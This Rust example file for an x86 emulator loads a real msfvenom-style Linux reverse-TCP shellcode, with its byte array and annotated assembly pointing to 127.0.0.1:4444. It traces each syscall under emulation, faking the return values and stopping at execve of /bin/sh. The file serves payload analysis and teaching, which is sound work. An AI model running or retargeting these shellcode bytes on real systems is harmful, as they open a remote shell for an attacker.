//! Shellcode Emulation with Detailed Syscall Analysis
//!
//! Loads a Linux x86-64 reverse-TCP shellcode (the same shape msfvenom
//! produces for `linux/x64/shell_reverse_tcp` and that sits at the bottom of
//! Metasploit's staged meterpreter payloads) and traces every instruction,
//! memory write, and Linux syscall with fully decoded arguments.
//!
//! ## Why this maps to meterpreter
//!
//! Stage-1 reverse-TCP shellcode is what grabs the meterpreter DLL over the
//! wire: on Linux the stager is ~74 bytes of `socket()/connect()/dup2()/execve()`
//! syscalls. The Windows meterpreter stager does the equivalent through
//! `ws2_32.dll` — PEB-walking, ROR-13 hash resolution, `WSAStartup`, etc. —
//! which would need a PE loader + kernel32/ws2_32 to emulate end-to-end.
//! Linux syscall-only shellcode is self-contained and faithfully shows the
//! analysis workflow: **decode instructions → watch stack build → intercept
//! each syscall → pretty-print args → spoof return values → continue**.
//!
//! ## What you see
//!
//! ```text
//! 0x00400000: 6a 29                push 0x29
//! 0x00400002: 58                   pop rax
//! 0x00400003: 99                   cdq
//! ...
//! 0x0040000a: 0f 05                syscall
//! ══════════════════════════════════════════════════════════════════════
//! SYSCALL  #41  socket
//!     domain   = 2  (AF_INET)
//!     type     = 1  (SOCK_STREAM)
//!     protocol = 0
//! >> faking return value: sockfd = 3 (intercepted, no real syscall)
//! ══════════════════════════════════════════════════════════════════════
//! ...
//! SYSCALL  #42  connect
//!     sockfd = 3
//!     addr   = 0x7fffffdff8 -> AF_INET 127.0.0.1:4444
//!     addrlen = 16
//! >> faking return value: 0 (success)
//! ...
//! SYSCALL  #59  execve
//!     filename = 0x7fffffdfd0 -> "/bin/sh"
//!     argv     = 0x7fffffdfc8 -> ["/bin/sh"]
//!     envp     = 0x0
//! >> execve would spawn /bin/sh here; stopping emulation
//! ```
//!
//! ## Usage
//!
//! ```bash
//! cargo run --release --example shellcode_trace \
//!     --features "std,instrumentation"
//! ```
//!
//! Env knobs:
//! - `TRACE_INSTRUCTIONS=0`  — silence per-instruction disassembly
//! - `TRACE_MEM=1`           — also log every memory write (very noisy)
//! - `MAX_INSTRUCTIONS=N`    — instruction budget (default 10_000)

#![cfg(all(feature = "std", feature = "instrumentation"))]

use rusty_box::{
    cpu::{
        core_i7_skylake::Corei7SkylakeX,
        decoder::{Instruction, Opcode},
        BranchType, CpuSetupMode, HookMask, Instrumentation, MemAccessRW, MemHookType,
        ResetReason, X86Reg,
    },
    emulator::{Emulator, EmulatorConfig},
};

mod syscalls;

// ─────────────────────────── Shellcode payload ───────────────────────────
//
// linux/x64/shell_reverse_tcp  (msfvenom output, cleaned up)
// Equivalent assembly:
//     push   0x29           ; socket
//     pop    rax
//     cdq
//     push   0x2            ; AF_INET
//     pop    rdi
//     push   0x1            ; SOCK_STREAM
//     pop    rsi
//     syscall
//     xchg   rdi, rax       ; sockfd -> rdi
//     movabs rcx, 0x0100007f5c110002  ; sockaddr(127.0.0.1:4444)
//     push   rcx
//     mov    rsi, rsp
//     push   0x10           ; addrlen
//     pop    rdx
//     push   0x2a           ; connect
//     pop    rax
//     syscall
//     push   0x3            ; dup2 for fds 0..=2
//     pop    rsi
// .loop:
//     dec    rsi
//     push   0x21
//     pop    rax
//     syscall
//     jne    .loop
//     push   0x3b           ; execve
//     pop    rax
//     cdq
//     movabs rbx, 0x68732f6e69622f   ; "/bin/sh\x00"
//     push   rbx
//     mov    rdi, rsp
//     push   rdx
//     push   rdi
//     mov    rsi, rsp
//     syscall
static SHELLCODE: &[u8] = &[
    0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x0f, 0x05, 0x48, 0x97,
    0x48, 0xb9, 0x02, 0x00, 0x11, 0x5c, 0x7f, 0x00, 0x00, 0x01, 0x51, 0x48, 0x89, 0xe6,
    0x6a, 0x10, 0x5a, 0x6a, 0x2a, 0x58, 0x0f, 0x05, 0x6a, 0x03, 0x5e, 0x48, 0xff, 0xce,
    0x6a, 0x21, 0x58, 0x0f, 0x05, 0x75, 0xf6, 0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f,
    0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x52, 0x57, 0x48,
    0x89, 0xe6, 0x0f, 0x05,
];

// ─────────────────────────── Layout constants ───────────────────────────

/// Shellcode load address. Chosen to match msfvenom's default RVA and to
/// stay below the identity-mapped 4 GiB region in `CpuSetupMode::FlatLong64`.
const SHELLCODE_BASE: u64 = 0x0040_0000;

/// Stack top (grows down). Must be inside FlatLong64's 4 GiB identity map.
const STACK_TOP: u64 = 0x8000_0000;

// ────────────────────────── Tracer ────────────────────────────────────────────────────────
//
// The tracer is monomorphized into the emulator at construction via
// `Emulator::<Corei7SkylakeX, TraceInstr>::new_with_instrumentation()`.
// Accessed via `emu.instrumentation()` / `emu.instrumentation_mut()` —
// plain field access, zero-cost, no `Arc<Mutex>`, no `unsafe`.

pub struct TraceInstr {
    /// Per-instruction disassembly log toggle.
    log_instr: bool,
    /// Memory-write tracing toggle (used during hook installation).
    #[allow(dead_code)]
    log_mem: bool,
    /// Count of syscalls intercepted.
    syscall_count: u32,
    /// Next fake file-descriptor handed back from `socket`/`accept`.
    next_fake_fd: u64,
    /// Set to `Some(rip)` by `far_branch` when SYSCALL fires; taken by the
    /// outer loop on the next `instrumentation_mut` call.
    pending_syscall: Option<u64>,
}

impl Instrumentation for TraceInstr {
    fn active_hooks(&self) -> HookMask {
        HookMask::EXEC | HookMask::BRANCH
    }

    fn before_execution(&mut self, rip: u64, instr: &Instruction) {
        if self.log_instr {
            print_disasm(rip, instr);
        }
    }

    fn far_branch(
        &mut self,
        what: BranchType,
        _prev_cs: u16,
        prev_rip: u64,
        _new_cs: u16,
        _new_rip: u64,
    ) {
        if matches!(what, BranchType::Syscall) {
            self.pending_syscall = Some(prev_rip);
        }
    }
}

// ─────────────────────────── Disassembly printer ───────────────────────────

fn print_disasm(rip: u64, instr: &Instruction) {
    // The Opcode debug form is enough for a shellcode trace — mnemonics
    // aren't formatted with operands, but combined with the instruction
    // length we can show hex bytes plus the decoded mnemonic.
    tracing::trace!(
        "0x{rip:08x}:  ilen={ilen}  {op:?}",
        rip = rip,
        ilen = instr.ilen(),
        op = instr.get_ia_opcode(),
    );
}

// ─────────────────────────── Syscall decoding ───────────────────────────

/// Pretty-print the syscall at the ABI point immediately after SYSCALL has
/// transitioned (RIP now at LSTAR, RCX = return RIP, R11 = flags, but the
/// kernel has not run yet — so RAX/RDI/... still hold user values).
///
/// Reads registers and tracer state immutably. The caller is responsible for
/// mutating tracer counters (`syscall_count`, `next_fake_fd`) after this returns.
fn decode_syscall(emu: &Emulator<Corei7SkylakeX, TraceInstr>) -> SyscallAction {
    // Read x86-64 syscall ABI registers.
    let nr = emu.reg_read(X86Reg::Rax);
    let a0 = emu.reg_read(X86Reg::Rdi);
    let a1 = emu.reg_read(X86Reg::Rsi);
    let a2 = emu.reg_read(X86Reg::Rdx);
    let a3 = emu.reg_read(X86Reg::R10);
    let _a4 = emu.reg_read(X86Reg::R8);
    let _a5 = emu.reg_read(X86Reg::R9);
    let rcx = emu.reg_read(X86Reg::Rcx);

    let tracer = emu.instrumentation();
    let count = tracer.syscall_count + 1;

    tracing::info!("═══════════════════════════════════════════════════════════════════════");
    tracing::info!(
        "SYSCALL  #{nr:<3} {name}  (call #{count})",
        nr = nr,
        name = syscalls::name_x86_64(nr as u32)
    );

    let action = match nr {
        // socket(domain, type, protocol)
        41 => {
            tracing::info!("    domain   = {a0}  ({name})", name = af_name(a0));
            tracing::info!("    type     = {a1}  ({name})", name = sock_type_name(a1));
            tracing::info!("    protocol = {a2}");
            let fd = tracer.next_fake_fd;
            tracing::info!(">> faking return value: sockfd = {fd} (intercepted)");
            SyscallAction::Return(fd)
        }
        // connect(sockfd, addr, addrlen)
        42 => {
            tracing::info!("    sockfd  = {a0}");
            let decoded = decode_sockaddr(emu, a1, a2 as usize);
            tracing::info!("    addr    = {a1:#018x} -> {decoded}");
            tracing::info!("    addrlen = {a2}");
            tracing::info!(">> faking return value: 0 (success)");
            SyscallAction::Return(0)
        }
        // dup2(oldfd, newfd)
        33 => {
            tracing::info!("    oldfd = {a0}");
            tracing::info!("    newfd = {a1}");
            tracing::info!(">> faking return value: {a1} (newfd)");
            SyscallAction::Return(a1)
        }
        // execve(filename, argv[], envp[])
        59 => {
            let path = read_c_string(emu, a0).unwrap_or_else(|| format!("<unreadable {a0:#x}>"));
            tracing::info!("    filename = {a0:#018x} -> {path:?}");
            tracing::info!(
                "    argv     = {a1:#018x} -> {args:?}",
                args = read_argv(emu, a1, 8).unwrap_or_default()
            );
            tracing::info!(
                "    envp     = {a2:#018x}{env}",
                env = if a2 == 0 {
                    String::new()
                } else {
                    format!(" -> {envs:?}", envs = read_argv(emu, a2, 8).unwrap_or_default())
                }
            );
            tracing::info!(">> execve would spawn the target here; stopping emulation");
            SyscallAction::Stop
        }
        // read/write/close/... — general passthrough traces.
        _ => {
            tracing::info!("    rdi = {a0:#018x}");
            tracing::info!("    rsi = {a1:#018x}");
            tracing::info!("    rdx = {a2:#018x}");
            tracing::info!("    r10 = {a3:#018x}");
            tracing::info!("    (return rip = rcx = {rcx:#018x})");
            tracing::info!(">> faking return value: 0");
            SyscallAction::Return(0)
        }
    };
    tracing::info!("═══════════════════════════════════════════════════════════════════════");
    action
}

enum SyscallAction {
    Return(u64),
    Stop,
}

/// Perform the instrumentation-side work to make `SyscallAction::Return`
/// observable to the continuing shellcode: set RIP back to the instruction
/// after SYSCALL (RCX holds the saved return address) and RAX to the
/// spoofed return value. Clear any pending stop_flag so `emu_start` keeps
/// going.
fn apply_syscall_return(emu: &mut Emulator<Corei7SkylakeX, TraceInstr>, retval: u64) {
    let rcx = emu.reg_read(X86Reg::Rcx);
    emu.reg_write(X86Reg::Rip, rcx);
    emu.reg_write(X86Reg::Rax, retval);
}

// ─────────────────────────── Sockaddr / string helpers ───────────────────────────

fn decode_sockaddr(emu: &Emulator<Corei7SkylakeX, TraceInstr>, addr: u64, len: usize) -> String {
    if len < 16 {
        return format!("(sockaddr too short, len={len})");
    }
    let family = emu.mem_read_u16_le(addr).unwrap_or(0);
    match family {
        // AF_INET — sockaddr_in. Port is big-endian.
        2 => {
            let port_be = emu.mem_read_u16_le(addr + 2).unwrap_or(0);
            let port = port_be.swap_bytes();
            let ip = emu.mem_read_u32_le(addr + 4).unwrap_or(0).to_le_bytes();
            format!(
                "AF_INET {}.{}.{}.{}:{}",
                ip[0], ip[1], ip[2], ip[3], port
            )
        }
        // AF_INET6 — decode abbreviated.
        10 => {
            let port_be = emu.mem_read_u16_le(addr + 2).unwrap_or(0);
            let port = port_be.swap_bytes();
            format!("AF_INET6 port={port}  (body not decoded)")
        }
        // AF_UNIX
        1 => {
            let path = read_c_string(emu, addr + 2).unwrap_or_default();
            format!("AF_UNIX {path:?}")
        }
        _ => format!("AF_UNKNOWN({family})"),
    }
}

fn af_name(family: u64) -> &'static str {
    match family {
        1 => "AF_UNIX",
        2 => "AF_INET",
        10 => "AF_INET6",
        16 => "AF_NETLINK",
        17 => "AF_PACKET",
        _ => "AF_?",
    }
}

fn sock_type_name(ty: u64) -> &'static str {
    // Mask off SOCK_CLOEXEC / SOCK_NONBLOCK flags.
    match ty & 0xFF {
        1 => "SOCK_STREAM",
        2 => "SOCK_DGRAM",
        3 => "SOCK_RAW",
        5 => "SOCK_SEQPACKET",
        _ => "SOCK_?",
    }
}

fn read_c_string(emu: &Emulator<Corei7SkylakeX, TraceInstr>, addr: u64) -> Option<String> {
    if addr == 0 {
        return None;
    }
    let mut bytes = Vec::with_capacity(64);
    for i in 0..256u64 {
        let b = emu.mem_read_u8(addr + i).ok()?;
        if b == 0 {
            break;
        }
        bytes.push(b);
    }
    Some(String::from_utf8_lossy(&bytes).into_owned())
}

fn read_argv(emu: &Emulator<Corei7SkylakeX, TraceInstr>, addr: u64, max: usize) -> Option<Vec<String>> {
    if addr == 0 {
        return None;
    }
    let mut argv = Vec::new();
    for i in 0..max {
        let slot = emu.mem_read_u64_le(addr + (i as u64) * 8).ok()?;
        if slot == 0 {
            break;
        }
        argv.push(read_c_string(emu, slot).unwrap_or_else(|| format!("<{slot:#x}>")));
    }
    Some(argv)
}

// ─────────────────────────── Main ───────────────────────────

fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    // Large thread stack: emulator is ~1.4 MB; tests show 64 MB is ample.
    std::thread::Builder::new()
        .stack_size(64 * 1024 * 1024)
        .name("shellcode".into())
        .spawn(run)
        .unwrap()
        .join()
        .unwrap()
}

fn run() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    tracing_subscriber::fmt()
        .with_max_level(tracing::Level::WARN)
        .with_target(false)
        .init();

    let log_instr = std::env::var("TRACE_INSTRUCTIONS").ok().as_deref() != Some("0");
    let log_mem = std::env::var("TRACE_MEM").ok().as_deref() == Some("1");
    let max_instr: u64 = std::env::var("MAX_INSTRUCTIONS")
        .ok()
        .and_then(|s| s.parse().ok())
        .unwrap_or(10_000);

    tracing::info!("───────────────────────────────────────────────────────────────────────");
    tracing::info!("Shellcode emulator — Linux x86-64 reverse-TCP payload");
    tracing::info!("  load addr    : {SHELLCODE_BASE:#018x}");
    tracing::info!("  size         : {} bytes", SHELLCODE.len());
    tracing::info!("  stack top    : {STACK_TOP:#018x}");
    tracing::info!("  max instr    : {max_instr}");
    tracing::info!("  log instr    : {log_instr}");
    tracing::info!("  log mem      : {log_mem}");
    tracing::info!("───────────────────────────────────────────────────────────────────────");

    // Build emulator: 128 MB guest RAM, long-mode identity-mapped.
    let config = EmulatorConfig {
        guest_memory_size: 128 * 1024 * 1024,
        host_memory_size: 128 * 1024 * 1024,
        ips: 1_000_000_000,
        pci_enabled: false,
        ..EmulatorConfig::default()
    };
    let tracer = TraceInstr {
        log_instr,
        log_mem,
        syscall_count: 0,
        next_fake_fd: 3,
        pending_syscall: None,
    };
    let mut emu = Emulator::<Corei7SkylakeX, TraceInstr>::new_with_instrumentation(config, tracer)?;
    // Replicate what new_with_mode does (which only works for T = ()).
    let cfg = emu.config_ref().clone();
    emu.memory.init_memory(cfg.guest_memory_size, cfg.host_memory_size, cfg.memory_block_size)?;
    emu.memory.set_a20_mask(emu.pc_system.a20_mask());
    emu.pc_system.initialize(cfg.ips);
    emu.cpu.reset(ResetReason::Hardware);
    emu.setup_cpu_mode(CpuSetupMode::FlatLong64)?;

    // Memory-write tracing (optional): show what the shellcode pushes to
    // the stack. Useful for seeing sockaddr/structs being built.
    if log_mem {
        let _ = emu.hook_add_mem(MemHookType::Write, .., move |ev| {
            if ev.access == MemAccessRW::Write {
                tracing::debug!(
                    "  MEM WRITE {:#018x} size={} val={:?}",
                    ev.addr,
                    ev.size,
                    ev.value
                );
            }
        });
    }

    // Install a branch hook that stops emulation the moment SYSCALL fires.
    // This lets us run in big batches (thousands of instructions) instead
    // of single-stepping, while still intercepting every syscall before the
    // LSTAR transition lands in unmapped territory.
    let stop = emu.stop_handle();
    let _h = emu.hook_add_branch(.., move |ev| {
        if let rusty_box::cpu::BranchEvent::Far { kind, .. } = *ev {
            if matches!(kind, BranchType::Syscall) {
                stop.stop();
            }
        }
    });

    // ── Execute ────────────────────────────────────────────────────────
    //
    // Run in 8 KB instruction batches. `emu_start` returns either because
    // the batch budget was exhausted, or because our branch hook called
    // `stop_handle.stop()` on a SYSCALL instruction. In both cases we
    // read RIP, decode any syscall, spoof the return value, and continue.

    let mut total_executed: u64 = 0;
    let mut remaining = max_instr;
    let mut entry_rip = SHELLCODE_BASE;

    loop {
        if remaining == 0 {
            tracing::warn!("Instruction budget exhausted at {total_executed}");
            break;
        }
        let budget = remaining.min(8_192);

        // emu_start sets RIP to `begin`, clears stop_flag, and runs up to
        // `count` instructions. Returns EmuStopReason::Stopped when our
        // hook fires stop_handle().stop().
        let reason = emu.emu_start(entry_rip, None, None, Some(budget))?;

        // Which instruction did we end up at? If the branch hook stopped
        // us, RIP is inside the syscall entry (LSTAR = 0 by default). If
        // the budget ran out, RIP is wherever the shellcode happened to be.
        entry_rip = emu.reg_read(X86Reg::Rip);

        // Detect "we just hit SYSCALL": before the syscall handler ran,
        // the CPU saved RIP+2 (length of the SYSCALL opcode bytes) into RCX.
        // When our hook fires stop(), the CPU has already done the
        // transition, so RCX holds the return address and RAX still holds
        // the caller-provided syscall number. That's exactly what we want.
        if matches!(reason, rusty_box::cpu::EmuStopReason::Stopped) {
            // Read syscall nr before decode so we can update tracer state after.
            let nr = emu.reg_read(X86Reg::Rax);
            let action = decode_syscall(&emu);
            // Mutate tracer state after decode (avoids borrow conflict).
            {
                let t = emu.instrumentation_mut();
                t.syscall_count += 1;
                if nr == 41 { t.next_fake_fd += 1; } // socket consumed an fd
            }
            match action {
                SyscallAction::Return(v) => {
                    apply_syscall_return(&mut emu, v);
                    entry_rip = emu.reg_read(X86Reg::Rip);
                    total_executed += 1; // SYSCALL itself counted once
                    if remaining > 0 { remaining -= 1; }
                    continue;
                }
                SyscallAction::Stop => {
                    tracing::info!("Stopping emulation per syscall handler.");
                    break;
                }
            }
        }

        // Budget exhausted without syscall — fall through and retry.
        total_executed += budget;
        remaining = remaining.saturating_sub(budget);

        // If RIP fell into unmapped space or the CPU triple-faulted,
        // break out cleanly.
        if emu.cpu.is_in_shutdown() {
            tracing::error!("CPU entered shutdown at {total_executed}");
            break;
        }
    }

    tracing::info!("───────────────────────────────────────────────────────────────────────");
    tracing::info!(
        "Summary: executed {total_executed} instructions, {calls} syscalls intercepted",
        total_executed = total_executed,
        calls = emu.instrumentation().syscall_count,
    );
    Ok(())
}


// Opcode import only pulled in to surface it to the reader of the top-of-
// file docs — runtime uses `instr.get_ia_opcode()` directly through Debug.
#[allow(dead_code)]
fn _keep_opcode_import(_o: Opcode) {}
